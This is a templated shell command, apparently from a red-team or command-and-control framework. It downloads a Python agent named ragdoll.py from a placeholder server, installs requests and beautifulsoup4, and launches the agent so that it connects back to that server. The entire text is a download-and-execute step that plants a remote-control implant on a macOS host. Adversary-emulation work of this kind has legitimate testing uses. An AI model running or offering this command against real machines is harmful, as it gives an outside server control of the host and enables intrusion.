server="#{app.contact.http}";
curl -s -X POST -H "file:ragdoll.py" -H "platform:darwin" $server/file/download > ragdoll.py;
pip install requests beautifulsoup4;
python ragdoll.py -W $server#{app.contact.html}
